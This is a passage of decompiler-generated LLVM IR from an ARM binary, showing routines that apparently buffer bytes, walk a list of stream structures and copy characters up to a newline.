  %v2_e5bc = inttoptr i32 %v1_e5bc to i32*
  %v3_e5bc = load i32, i32* %v2_e5bc, align 4
  %v3_e5c0 = icmp uge i32 %v3_e5b8, %v3_e5bc
  store i1 %v3_e5c0, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_e5c0, label %dec_label_pc_e5d4, label %bb

bb:                                               ; preds = %dec_label_pc_e5b8
  %v5_e5c4 = inttoptr i32 %v3_e5b8 to i8*
  store i8 %arg1, i8* %v5_e5c4, align 1
  %v0_e5c8.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  %v3_e5d4.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_e5c8.pr, label %dec_label_pc_e5d4, label %.thread1

.thread1:                                         ; preds = %bb
  %v2_e5c8 = inttoptr i32 %v3_e5d4.pre to i8*
  %v3_e5c8 = load i8, i8* %v2_e5c8, align 1
  %v4_e5c8 = zext i8 %v3_e5c8 to i32
  store i32 %v4_e5c8, i32* %r5.global-to-local, align 4
  %v6_e5c8 = add i32 %v3_e5d4.pre, 1
  store i32 %v6_e5c8, i32* %r2.global-to-local, align 4
  store i32 %v6_e5c8, i32* %v2_e5b8, align 4
  br label %dec_label_pc_e644

dec_label_pc_e5d4:                                ; preds = %bb, %dec_label_pc_e5b8
  %v3_e5d4 = phi i32 [ %v3_e5b8, %dec_label_pc_e5b8 ], [ %v3_e5d4.pre, %bb ]
  %v5_e5d4 = call i32 @function_ea1c(i8 %arg1, i32 %arg2, i32 %v3_e5d4)
  store i32 %v5_e5d4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e644

dec_label_pc_e5e0:                                ; preds = %dec_label_pc_e594
  store i32 %v2_e5a4, i32* @r0, align 4
  %v1_e5f0 = call i32 @function_10840()
  store i32 58884, i32* @lr, align 4
  %v1_e600 = call i32 @function_10838()
  %v0_e604 = load i32, i32* @r4, align 4
  %v1_e604 = add i32 %v0_e604, 16
  %v2_e604 = inttoptr i32 %v1_e604 to i32*
  %v3_e604 = load i32, i32* %v2_e604, align 4
  store i32 %v3_e604, i32* %r2.global-to-local, align 4
  %v1_e608 = add i32 %v0_e604, 28
  %v2_e608 = inttoptr i32 %v1_e608 to i32*
  %v3_e608 = load i32, i32* %v2_e608, align 4
  %v3_e60c = icmp uge i32 %v3_e604, %v3_e608
  store i1 %v3_e60c, i1* %cpsr_c.global-to-local, align 1
  %v0_e614 = load i32, i32* @r5, align 4
  %v1_e614 = trunc i32 %v0_e614 to i8
  br i1 %v3_e60c, label %dec_label_pc_e628, label %bb12

bb12:                                             ; preds = %dec_label_pc_e5e0
  %v4_e618 = inttoptr i32 %v3_e604 to i8*
  store i8 %v1_e614, i8* %v4_e618, align 1
  %v0_e61c.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  %v3_e628.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_e61c.pr, label %dec_label_pc_e628, label %.thread4

.thread4:                                         ; preds = %bb12
  %v2_e61c = inttoptr i32 %v3_e628.pre to i8*
  %v3_e61c = load i8, i8* %v2_e61c, align 1
  %v4_e61c = zext i8 %v3_e61c to i32
  store i32 %v4_e61c, i32* %r5.global-to-local, align 4
  %v6_e61c = add i32 %v3_e628.pre, 1
  store i32 %v6_e61c, i32* %r2.global-to-local, align 4
  %v2_e620 = load i32, i32* @r4, align 4
  %v3_e620 = add i32 %v2_e620, 16
  %v4_e620 = inttoptr i32 %v3_e620 to i32*
  store i32 %v6_e61c, i32* %v4_e620, align 4
  br label %dec_label_pc_e630

dec_label_pc_e628:                                ; preds = %bb12, %dec_label_pc_e5e0
  %v3_e628 = phi i32 [ %v3_e604, %dec_label_pc_e5e0 ], [ %v3_e628.pre, %bb12 ]
  %v5_e628 = call i32 @function_ea1c(i8 %v1_e614, i32 %v0_e604, i32 %v3_e628)
  store i32 %v5_e628, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e630

dec_label_pc_e630:                                ; preds = %.thread4, %dec_label_pc_e628
  store i32 %v2_e5a4, i32* @r0, align 4
  store i32 58948, i32* @lr, align 4
  %v1_e640 = call i32 @function_10840()
  br label %dec_label_pc_e644

dec_label_pc_e644:                                ; preds = %.thread1, %dec_label_pc_e5d4, %dec_label_pc_e630
  %v0_e644 = load i32, i32* %r5.global-to-local, align 4
  %v2_e64c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e64c, i32* @r4, align 4
  store i32 %v6_e594, i32* @r5, align 4
  store i32 %v9_e594, i32* @r6, align 4
  %sext = mul i32 %v0_e644, 16777216
  %v15_e64c = sdiv i32 %sext, 16777216
  ret i32 %v15_e64c

; uselistorder directives
  uselistorder i32 %v3_e628.pre, { 0, 2, 1 }
  uselistorder i8 %v1_e614, { 1, 0 }
  uselistorder i32 %v3_e5d4.pre, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 5, 4 }
  uselistorder i8 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e644, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e630, { 1, 0 }
}

define i32 @function_e660(i32 %arg1) local_unnamed_addr {
dec_label_pc_e660:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v2_e664 = ptrtoint i32* %stack_var_-48 to i32
  %v2_e668 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_e668, i32* @r0, align 4
  store i32 67648, i32* %r4.global-to-local, align 4
  %v1_e67c = call i32 @function_10840()
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r5.global-to-local, align 4
  %v1_e68c = call i32 @function_10838()
  %v2_e694 = load i32, i32* @global_var_1f91c.276, align 4
  %v7_e698 = icmp eq i32 %v2_e694, 1
  br i1 %v7_e698, label %dec_label_pc_e6a0, label %dec_label_pc_e74c

dec_label_pc_e6a0:                                ; preds = %dec_label_pc_e660
  %v2_e6a4 = load i32, i32* @global_var_1f920.281, align 4
  %tmp19 = icmp slt i32 %v2_e6a4, 1
  br i1 %tmp19, label %dec_label_pc_e74c, label %dec_label_pc_e6b0

dec_label_pc_e6b0:                                ; preds = %dec_label_pc_e6a0
  store i32 %v2_e664, i32* @r0, align 4
  %v1_e6c0 = call i32 @function_10840()
  %v1_e6cc = call i32 @function_10838()
  %v2_e6d4 = load i32, i32* bitcast (i32** @global_var_1f184.318 to i32*), align 4
  store i32 %v2_e6d4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_e7243 = icmp eq i32 %v2_e6d4, 0
  br i1 %v2_e7243, label %dec_label_pc_e730, label %dec_label_pc_e6e0

dec_label_pc_e6e0:                                ; preds = %dec_label_pc_e6b0, %dec_label_pc_e720
  %v1_e6f8 = phi i32 [ %v0_e720, %dec_label_pc_e720 ], [ %v2_e6d4, %dec_label_pc_e6b0 ]
  %v1_e6e0 = inttoptr i32 %v1_e6f8 to i8*
  %v2_e6e0 = load i8, i8* %v1_e6e0, align 1
  %v3_e6e0 = zext i8 %v2_e6e0 to i32
  %v1_e6e4 = add i32 %v1_e6f8, 1
  %v2_e6e4 = inttoptr i32 %v1_e6e4 to i8*
  %v3_e6e4 = load i8, i8* %v2_e6e4, align 1
  %v4_e6e4 = zext i8 %v3_e6e4 to i32
  %v4_e6e8 = mul nuw nsw i32 %v4_e6e4, 256
  %v5_e6e8 = or i32 %v4_e6e8, %v3_e6e0
  %v2_e6ec = and i32 %v5_e6e8, 32816
  %v7_e6f0 = icmp eq i32 %v2_e6ec, 48
  %v1_e6f4 = add i32 %v1_e6f8, 32
  %v2_e6f4 = inttoptr i32 %v1_e6f4 to i32*
  %v3_e6f4 = load i32, i32* %v2_e6f4, align 4
  store i32 %v3_e6f4, i32* %r5.global-to-local, align 4
  br i1 %v7_e6f0, label %dec_label_pc_e700, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_e6e0
  store i32 %v1_e6f8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e720

dec_label_pc_e700:                                ; preds = %dec_label_pc_e6e0
  %v0_e700 = load i32, i32* %r6.global-to-local, align 4
  %v2_e700 = icmp eq i32 %v0_e700, 0
  br i1 %v2_e700, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_e700
  %v3_e708 = add i32 %v0_e700, 32
  %v4_e708 = inttoptr i32 %v3_e708 to i32*
  store i32 %v3_e6f4, i32* %v4_e708, align 4
  %v0_e710.pre = load i32, i32* %r4.global-to-local, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_e700
  store i32 %v3_e6f4, i32* bitcast (i32** @global_var_1f184.318 to i32*), align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_e710 = phi i32 [ %v0_e710.pre, %.thread ], [ %v1_e6f8, %.thread1 ]
  %v1_e710 = add i32 %v0_e710, 1
  %v2_e710 = inttoptr i32 %v1_e710 to i8*
  %v3_e710 = load i8, i8* %v2_e710, align 1
  %v1_e714 = and i8 %v3_e710, 32
  %v1_e71c = icmp ne i8 %v1_e714, 0
  call void @__pseudo_cond_branch(i1 %v1_e71c, i32 ptrtoint (i32* @global_var_fa5c.278 to i32))
  %v0_e720.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e720

dec_label_pc_e720:                                ; preds = %.thread12, %bb
  %v0_e720 = phi i32 [ %v0_e720.pre, %bb ], [ %v3_e6f4, %.thread12 ]
  store i32 %v0_e720, i32* %r4.global-to-local, align 4
  %v2_e724 = icmp eq i32 %v0_e720, 0
  br i1 %v2_e724, label %dec_label_pc_e730, label %dec_label_pc_e6e0

dec_label_pc_e730:                                ; preds = %dec_label_pc_e720, %dec_label_pc_e6b0
  store i32 %v2_e664, i32* @r0, align 4
  %v1_e740 = call i32 @function_10840()
  %v0_e748 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e748, i32* @global_var_1f920.281, align 4
  %v2_e750.pre = load i32, i32* @global_var_1f91c.276, align 4
  br label %dec_label_pc_e74c

dec_label_pc_e74c:                                ; preds = %dec_label_pc_e660, %dec_label_pc_e6a0, %dec_label_pc_e730
  %v2_e750 = phi i32 [ %v2_e694, %dec_label_pc_e660 ], [ 1, %dec_label_pc_e6a0 ], [ %v2_e750.pre, %dec_label_pc_e730 ]
  %v1_e754 = add i32 %v2_e750, -1
  store i32 %v1_e754, i32* @global_var_1f91c.276, align 4
  store i32 %v2_e668, i32* @r0, align 4
  store i32 59248, i32* @lr, align 4
  %v1_e76c = call i32 @function_10840()
  ret i32 %v1_e76c

; uselistorder directives
  uselistorder i32 %v0_e720, { 2, 1, 0 }
  uselistorder i32 %v3_e6f4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_e6f8, { 0, 1, 2, 4, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder i32* @global_var_1f920.281, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e74c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e720, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_e6e0, { 1, 0 }
}

define i32 @function_e7a0(i8* %arg1) local_unnamed_addr {
dec_label_pc_e7a0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_e7a0 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32** @global_var_1f184.318 to i32), i32* %r3.global-to-local, align 4
  %v10_e7a8 = icmp eq i8* %arg1, bitcast (i32** @global_var_1f184.318 to i8*)
  store i1 %v10_e7a8, i1* %cpsr_z.global-to-local, align 1
  %.v1_e7ac = select i1 %v10_e7a8, i32 0, i32 %tmp
  store i32 %.v1_e7ac, i32* %r8.global-to-local, align 4
  %v2_e7b4 = ptrtoint i32* %stack_var_-44 to i32
  br i1 %v10_e7a8, label %bb, label %dec_label_pc_e7c0

bb:                                               ; preds = %dec_label_pc_e7a0
  store i32 %.v1_e7ac, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e7cc

dec_label_pc_e7c0:                                ; preds = %dec_label_pc_e7a0
  %v2_e7c0 = icmp eq i32 %.v1_e7ac, 0
  store i1 %v2_e7c0, i1* %cpsr_z.global-to-local, align 1
  store i32 256, i32* %sl.global-to-local, align 4
  br i1 %v2_e7c0, label %dec_label_pc_e7cc, label %dec_label_pc_e918

dec_label_pc_e7cc:                                ; preds = %bb, %dec_label_pc_e7c0
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_e7b4, i32* @r0, align 4
  %v1_e7e0 = call i32 @function_10840()
  store i32 ptrtoint (i32* @global_var_1f1a0.274 to i32), i32* %r0.global-to-local, align 4
  %v1_e7f0 = call i32 @function_10838()
  %v2_e7f8 = load i32, i32* @global_var_1f91c.276, align 4
  %v1_e7fc = add i32 %v2_e7f8, 1
  store i32 %v1_e7fc, i32* %r3.global-to-local, align 4
  store i32 %v1_e7fc, i32* @global_var_1f91c.276, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_e7b4, i32* @r0, align 4
  %v1_e814 = call i32 @function_10840()
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_e7b4, i32* @r0, align 4
  %v1_e828 = call i32 @function_10840()
  store i32 ptrtoint (i32* @global_var_1f188.315 to i32), i32* %r0.global-to-local, align 4
  %v1_e834 = call i32 @function_10838()
  store i32 ptrtoint (i32** @global_var_1f184.318 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_e7b4, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_e844 = load i32, i32* bitcast (i32** @global_var_1f184.318 to i32*), align 4
  store i32 %v2_e844, i32* @r6, align 4
  %v1_e84c = call i32 @function_10840()
  store i32 %v1_e84c, i32* %r0.global-to-local, align 4
  store i32 %v2_e7b4, i32* @r4, align 4
  %v0_e854 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_e854, i32* @r5, align 4
  %v0_e908.pr = load i32, i32* @r6, align 4
  %v2_e90825 = icmp eq i32 %v0_e908.pr, 0
  store i1 %v2_e90825, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e90825, label %dec_label_pc_e910, label %dec_label_pc_e85c

dec_label_pc_e85c:                                ; preds = %dec_label_pc_e7cc, %.thread11
  %v0_e878 = phi i32 [ %v3_e904, %.thread11 ], [ %v0_e908.pr, %dec_label_pc_e7cc ]
  %v1_e85c = inttoptr i32 %v0_e878 to i8*
  %v2_e85c = load i8, i8* %v1_e85c, align 1
  %v3_e85c = zext i8 %v2_e85c to i32
  store i32 %v3_e85c, i32* %r3.global-to-local, align 4
  %v1_e860 = and i32 %v3_e85c, 64
  %v2_e860 = icmp eq i32 %v1_e860, 0
  store i1 %v2_e860, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e860, label %.thread11, label %dec_label_pc_e868

dec_label_pc_e868:                                ; preds = %dec_label_pc_e85c
  %v2_e86c = load i32, i32* @global_var_1f1b8.309, align 4
  store i32 %v2_e86c, i32* %r3.global-to-local, align 4
  %v7_e870 = icmp eq i32 %v2_e86c, 2
  store i1 %v7_e870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e870, label %dec_label_pc_e8a4, label %dec_label_pc_e878

dec_label_pc_e878:                                ; preds = %dec_label_pc_e868
  %v1_e878 = add i32 %v0_e878, 56
  store i32 %v1_e878, i32* @r4, align 4
  store i32 %v2_e7b4, i32* @r0, align 4
  store i32 67648, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r1.global-to-local, align 4
  %v1_e890 = call i32 @function_10840()
  %v0_e894 = load i32, i32* @r4, align 4
  store i32 %v0_e894, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r3.global-to-local, align 4
  %v1_e8a0 = call i32 @function_10838()
  store i32 %v1_e8a0, i32* %r0.global-to-local, align 4
  %v0_e8a4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e8a4

dec_label_pc_e8a4:                                ; preds = %dec_label_pc_e868, %dec_label_pc_e878
  %v0_e8b8 = phi i32 [ %v0_e878, %dec_label_pc_e868 ], [ %v0_e8a4.pre, %dec_label_pc_e878 ]
  %v1_e8a4 = inttoptr i32 %v0_e8b8 to i32*
  %v2_e8a4 = load i32, i32* %v1_e8a4, align 4
  %v0_e8a8 = load i32, i32* %sl.global-to-local, align 4
  %v2_e8a8 = or i32 %v0_e8a8, %v2_e8a4
  %v1_e8ac = xor i32 %v2_e8a8, 320
  store i32 %v1_e8ac, i32* %r3.global-to-local, align 4
  %v1_e8b0 = and i32 %v1_e8ac, 832
  %v2_e8b0 = icmp eq i32 %v1_e8b0, 0
  store i1 %v2_e8b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e8b0, label %dec_label_pc_e8b8, label %bb39

dec_label_pc_e8b8:                                ; preds = %dec_label_pc_e8a4
  store i32 %v0_e8b8, i32* @r0, align 4
  %v0_e8bc = call i32 @function_d60c()
  store i32 %v0_e8bc, i32* %r0.global-to-local, align 4
  %v2_e8c0 = icmp eq i32 %v0_e8bc, 0
  store i1 %v2_e8c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e8c0, label %.thread5, label %.thread7

.thread5:                                         ; preds = %dec_label_pc_e8b8
  %v1_e8c4 = load i32, i32* @r6, align 4
  %v2_e8c4 = inttoptr i32 %v1_e8c4 to i32*
  %v3_e8c4 = load i32, i32* %v2_e8c4, align 4
  store i32 %v3_e8c4, i32* %r3.global-to-local, align 4
  %v2_e8c8 = add i32 %v1_e8c4, 8
  %v3_e8c8 = inttoptr i32 %v2_e8c8 to i32*
  %v4_e8c8 = load i32, i32* %v3_e8c8, align 4
  %v2_e8cc = and i32 %v3_e8c4, -65
  store i32 %v2_e8cc, i32* %r3.global-to-local, align 4
  %v4_e8d0 = sdiv i32 %v3_e8c4, 256
  store i32 %v4_e8d0, i32* %r1.global-to-local, align 4
  %v3_e8d4 = add i32 %v1_e8c4, 28
  %v4_e8d4 = inttoptr i32 %v3_e8d4 to i32*
  store i32 %v4_e8c8, i32* %v4_e8d4, align 4
  %v1_e8d8 = load i32, i32* %r1.global-to-local, align 4
  %v2_e8d8 = trunc i32 %v1_e8d8 to i8
  %v3_e8d8 = load i32, i32* @r6, align 4
  %v4_e8d8 = add i32 %v3_e8d8, 1
  %v5_e8d8 = inttoptr i32 %v4_e8d8 to i8*
  store i8 %v2_e8d8, i8* %v5_e8d8, align 1
  %v0_e8dc.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e8dc.pr.pr.pr, label %.thread6, label %.thread7

.thread6:                                         ; preds = %.thread5
  %v1_e8dc = load i32, i32* %r3.global-to-local, align 4
  %v2_e8dc = trunc i32 %v1_e8dc to i8
  %v3_e8dc = load i32, i32* @r6, align 4
  %v4_e8dc = inttoptr i32 %v3_e8dc to i8*
  store i8 %v2_e8dc, i8* %v4_e8dc, align 1
  %v0_e8e0.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e8e0.pr.pr.pr, label %bb39, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_e8b8, %.thread5, %.thread6
  store i32 -1, i32* @r5, align 4
  br label %bb39

bb39:                                             ; preds = %dec_label_pc_e8a4, %.thread6, %.thread7
  %v2_e8e8 = load i32, i32* @global_var_1f1b8.309, align 4
  store i32 %v2_e8e8, i32* %r3.global-to-local, align 4
  %v7_e8ec = icmp eq i32 %v2_e8e8, 2
  store i1 %v7_e8ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8ec, label %.thread11, label %bb40

bb40:                                             ; preds = %bb39
  store i32 %v2_e7b4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 67648, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 67648)
  br label %.thread11

.thread11:                                        ; preds = %bb39, %dec_label_pc_e85c, %bb40
  %v0_e904 = load i32, i32* @r6, align 4
  %v1_e904 = add i32 %v0_e904, 32
  %v2_e904 = inttoptr i32 %v1_e904 to i32*
  %v3_e904 = load i32, i32* %v2_e904, align 4
  store i32 %v3_e904, i32* @r6, align 4
  %v2_e908 = icmp eq i32 %v3_e904, 0
  store i1 %v2_e908, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e908, label %dec_label_pc_e908.dec_label_pc_e910_crit_edge, label %dec_label_pc_e85c

dec_label_pc_e908.dec_label_pc_e910_crit_edge:    ; preds = %.thread11
  %v0_e910.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e910

dec_label_pc_e910:                                ; preds = %dec_label_pc_e908.dec_label_pc_e910_crit_edge, %dec_label_pc_e7cc
  %v0_e910 = phi i32 [ %v0_e910.pre, %dec_label_pc_e908.dec_label_pc_e910_crit_edge ], [ %v1_e84c, %dec_label_pc_e7cc ]
  %v1_e910 = call i32 @function_e660(i32 %v0_e910)
  store i32 %v1_e910, i32* %r0.global-to-local, align 4
  %v0_e954.pre = load i32, i32* @r5, align 4
  br label %bb43

dec_label_pc_e918:                                ; preds = %dec_label_pc_e7c0
  %v1_e918 = inttoptr i32 %.v1_e7ac to i8*
  %v2_e918 = load i8, i8* %v1_e918, align 1
  %v3_e918 = zext i8 %v2_e918 to i32
  %v1_e91c = and i32 %v3_e918, 64
  store i32 %v1_e91c, i32* %r3.global-to-local, align 4
  %v2_e91c = icmp eq i32 %v1_e91c, 0
  store i1 %v2_e91c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e91c, label %bb41, label %dec_label_pc_e928

bb41:                                             ; preds = %dec_label_pc_e918
  br label %bb43

dec_label_pc_e928:                                ; preds = %dec_label_pc_e918
  %v0_e928 = call i32 @function_d60c()
  store i32 %v0_e928, i32* %r0.global-to-local, align 4
  %v2_e92c = icmp eq i32 %v0_e928, 0
  store i1 %v2_e92c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e92c, label %.thread16, label %bb42

.thread16:                                        ; preds = %dec_label_pc_e928
  %v1_e930 = load i32, i32* %r8.global-to-local, align 4
  %v2_e930 = inttoptr i32 %v1_e930 to i32*
  %v3_e930 = load i32, i32* %v2_e930, align 4
  store i32 %v3_e930, i32* %r3.global-to-local, align 4
  %v2_e934 = add i32 %v1_e930, 8
  %v3_e934 = inttoptr i32 %v2_e934 to i32*
  %v4_e934 = load i32, i32* %v3_e934, align 4
  store i32 %v4_e934, i32* %r1.global-to-local, align 4
  %v2_e938 = and i32 %v3_e930, -65
  store i32 %v2_e938, i32* %r3.global-to-local, align 4
  %v4_e93c = sdiv i32 %v3_e930, 256
  %v2_e940 = trunc i32 %v4_e93c to i8
  %v4_e940 = add i32 %v1_e930, 1
  %v5_e940 = inttoptr i32 %v4_e940 to i8*
  store i8 %v2_e940, i8* %v5_e940, align 1
  %v0_e944.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e944.pr.pr.pr, label %.thread18, label %.thread21

.thread18:                                        ; preds = %.thread16
  %v1_e944 = load i32, i32* %r1.global-to-local, align 4
  %v2_e944 = load i32, i32* %r8.global-to-local, align 4
  %v3_e944 = add i32 %v2_e944, 28
  %v4_e944 = inttoptr i32 %v3_e944 to i32*
  store i32 %v1_e944, i32* %v4_e944, align 4
  %v1_e948 = load i32, i32* %r3.global-to-local, align 4
  %v2_e948 = trunc i32 %v1_e948 to i8
  %v3_e948 = load i32, i32* %r8.global-to-local, align 4
  %v4_e948 = inttoptr i32 %v3_e948 to i8*
  store i8 %v2_e948, i8* %v4_e948, align 1
  %v0_e94c.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e94c.pr.pr.pr, label %.thread20, label %.thread21

.thread21:                                        ; preds = %.thread16, %.thread18
  br label %bb43

bb42:                                             ; preds = %dec_label_pc_e928
  br label %bb43

.thread20:                                        ; preds = %.thread18
  br label %bb43

bb43:                                             ; preds = %bb41, %bb42, %.thread21, %dec_label_pc_e910, %.thread20
  %v0_e954 = phi i32 [ -1, %.thread21 ], [ 0, %bb41 ], [ %v0_e954.pre, %dec_label_pc_e910 ], [ -1, %bb42 ], [ 0, %.thread20 ]
  store i32 %v0_e954, i32* %r0.global-to-local, align 4
  store i32 %v3_e7a0, i32* @r4, align 4
  ret i32 %v0_e954

; uselistorder directives
  uselistorder i32 %v0_e954, { 1, 0 }
  uselistorder i32 %v3_e904, { 1, 2, 0 }
  uselistorder i32 %v2_e7b4, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 7, 5, 6, 2, 0, 8, 1, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 12, 4, 6, 7, 8, 9, 10, 11, 5, 13, 14 }
  uselistorder i32 (i32)* @function_e660, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_1f184.318 to i32*), { 3, 0, 4, 1, 2, 5 }
  uselistorder i32* @global_var_1f91c.276, { 1, 4, 2, 0, 5, 3, 6 }
  uselistorder label %bb43, { 4, 1, 2, 0, 3 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %bb39, { 2, 1, 0 }
  uselistorder label %.thread7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e8a4, { 1, 0 }
  uselistorder label %dec_label_pc_e85c, { 1, 0 }
  uselistorder label %dec_label_pc_e7cc, { 1, 0 }
}

define i32 @function_e984(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_e984:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e988 = icmp eq i32 %arg2, 0
  store i1 %v2_e988, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp14 = icmp slt i32 %arg2, 1
  br i1 %tmp14, label %dec_label_pc_ea10, label %dec_label_pc_e9f4.preheader

dec_label_pc_e9f4.preheader:                      ; preds = %dec_label_pc_e984
  store i32 %tmp, i32* @r4, align 4
  %v1_e9f415 = add i32 %arg2, -1
  store i32 %v1_e9f415, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_e9f421 = icmp eq i32 %arg2, 1
  store i1 %v7_e9f421, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9f421, label %dec_label_pc_ea00, label %dec_label_pc_e9a0

dec_label_pc_e9a0:                                ; preds = %dec_label_pc_e9f4.preheader, %dec_label_pc_e9f4.backedge
  %v1_e9f824.in = phi i32 [ %v0_e9f8.pre, %dec_label_pc_e9f4.backedge ], [ %arg3, %dec_label_pc_e9f4.preheader ]
  %v1_e9a0 = add i32 %v1_e9f824.in, 16
  %v2_e9a0 = inttoptr i32 %v1_e9a0 to i32*
  %v3_e9a0 = load i32, i32* %v2_e9a0, align 4
  store i32 %v3_e9a0, i32* %r2.global-to-local, align 4
  %v1_e9a4 = add i32 %v1_e9f824.in, 24
  %v2_e9a4 = inttoptr i32 %v1_e9a4 to i32*
  %v3_e9a4 = load i32, i32* %v2_e9a4, align 4
  %v3_e9a8 = icmp uge i32 %v3_e9a0, %v3_e9a4
  store i1 %v3_e9a8, i1* %cpsr_c.global-to-local, align 1
  %v9_e9a8 = icmp eq i32 %v3_e9a0, %v3_e9a4
  store i1 %v9_e9a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e9a8, label %dec_label_pc_e9c8, label %dec_label_pc_e9b0

dec_label_pc_e9b0:                                ; preds = %dec_label_pc_e9a0
  %v1_e9b0 = inttoptr i32 %v3_e9a0 to i8*
  %v2_e9b0 = load i8, i8* %v1_e9b0, align 1
  %v5_e9b0 = add i32 %v3_e9a0, 1
  store i32 %v5_e9b0, i32* %r2.global-to-local, align 4
  %v2_e9b4 = load i32, i32* @r4, align 4
  %v3_e9b4 = inttoptr i32 %v2_e9b4 to i8*
  store i8 %v2_e9b0, i8* %v3_e9b4, align 1
  %v0_e9b8 = load i32, i32* @r4, align 4
  %v1_e9b8 = inttoptr i32 %v0_e9b8 to i8*
  %v2_e9b8 = load i8, i8* %v1_e9b8, align 1
  %v5_e9b8 = add i32 %v0_e9b8, 1
  store i32 %v5_e9b8, i32* @r4, align 4
  %v2_e9bc = icmp ugt i8 %v2_e9b8, 9
  store i1 %v2_e9bc, i1* %cpsr_c.global-to-local, align 1
  %v7_e9bc = icmp eq i8 %v2_e9b8, 10
  store i1 %v7_e9bc, i1* %cpsr_z.global-to-local, align 1
